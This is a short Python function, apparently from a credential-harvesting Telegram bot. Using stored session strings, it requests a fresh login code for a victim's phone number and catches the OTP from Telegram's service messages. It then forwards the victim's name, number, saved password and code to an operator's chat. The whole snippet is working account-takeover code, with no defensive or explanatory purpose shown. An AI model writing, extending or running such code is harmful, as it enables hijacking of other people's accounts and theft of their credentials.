async def monitor_new_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data.get('session'): return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    
    try:
        # Pastikan koneksi benar-benar aktif sebelum memanggil fungsi apa pun
        await client.connect()
        if not await client.is_user_authorized():
            print("DEBUG: Sesi tidak valid atau terputus.")
            return

        # Mengatasi AuthRestartError dengan mencoba ulang jika diminta Telegram
        try:
            await client.send_code_request(nomor)
        except Exception as e:
            if "Restart the authorization" in str(e):
                await asyncio.sleep(2)
                await client.send_code_request(nomor)
            else:
                raise e

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # Update Pesan Utama
                bot_api("editMessageText", {
                    "chat_id": CHAT_ID, "message_id": data['msg_id'],
                    "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                    "parse_mode": "Markdown", 
                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                # Hapus Pesan "Siap"
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                    data['status_id'] = None
                await client.disconnect()
        
        await asyncio.sleep(120) 
    except Exception as e:
        print(f"DEBUG Error: {e}")
    finally:
        if client.is_connected():
            await client.disconnect()